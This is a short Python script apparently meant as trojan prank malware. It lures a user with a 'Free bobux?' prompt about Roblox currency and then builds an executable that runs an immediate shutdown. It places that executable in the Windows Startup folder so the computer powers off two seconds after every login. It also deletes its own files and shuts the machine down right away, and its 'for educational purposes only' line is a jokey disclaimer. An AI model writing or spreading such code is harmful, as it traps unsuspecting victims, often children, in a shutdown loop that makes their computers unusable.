import os,shutil,time

def exotic():
    exoticcum = "stuck1.py"
    exoticownsu = open(exoticcum, "w")
    exoticownsu.write(r'''
import os,shutil
os.system('shutdown -s -t 2')
    ''')
    exoticownsu.close()
    os.system('pyinstaller --onefile stuck1.py')
#You can edit the "NAME" to a different USER name
    shutil.move(r"C:\Users\NAME\Desktop\dist\stuck1.exe", r"C:\Users\NAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    os.remove("stuck1.py")
    os.remove("stuck.py")
    os.remove("stuck1.spec")
    os.system('shutdown -s -t 2')

input("Free bobux? (y/n)")
exotic()


#MADE BY EXOTIC --> FOR EDUCATIONAL PURPOSES ONLY XDDDDD